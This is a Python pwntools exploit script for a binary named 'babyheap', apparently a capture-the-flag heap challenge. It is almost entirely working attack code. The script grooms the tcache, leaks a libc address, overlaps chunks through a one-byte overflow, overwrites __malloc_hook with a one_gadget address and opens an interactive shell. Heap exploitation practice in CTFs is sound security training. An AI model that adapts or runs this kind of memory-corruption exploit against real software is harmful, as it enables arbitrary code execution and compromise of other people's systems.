from pwn import *

# Set up pwntools for the correct architecture
exe = "./babyheap"
context.binary = elf = ELF(exe)
context.log_level = "debug"
context.aslr = True

libc = ELF("./libc.so.6")

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

def alloc(size, cont):
    ru(b"> ")
    sl(b"M")
    ru(b"> ")
    sl(str(size).encode())
    ru(b"> ")
    sl(cont)
    global count 
    count+=1
    return count

def free(ind):
    ru(b"> ")
    sl(b"F")
    ru(b"> \n")
    sl(str(ind).encode())
    global count 
    count -= 1


def show(ind):
    ru(b"> ")
    sl(b"S")
    ru(b"> ")
    sl(str(ind).encode())   

#helper:
count = -1

r = start()
# r = remote("", )

for i in range(7):
    alloc(50, "babu")
alloc(376, "juju")
alloc(50, "babu")
alloc(50, "babu")

for i in range(9, -1, -1):
    free(i)

for i in range(7):
    alloc(50, f"{count}")

show(alloc(50, b"AAAAAAAA"))
ru(b"AAAAAAAA")
leak = u64(re(6).ljust(8, b"\x00")) - 1986192
libc.address = leak

log.info(f"{hex(leak)}")

alloc(376, b"A"*376 + b"\x81")
free(5)
free(7)
free(6)

alloc(376, b"A"*(0x100) + p64(libc.sym.__malloc_hook)[:-2] )

oneg = libc.address + 0x106ef8
alloc(50, "bubu")
alloc(50, p64(oneg)[:-2])

r.interactive()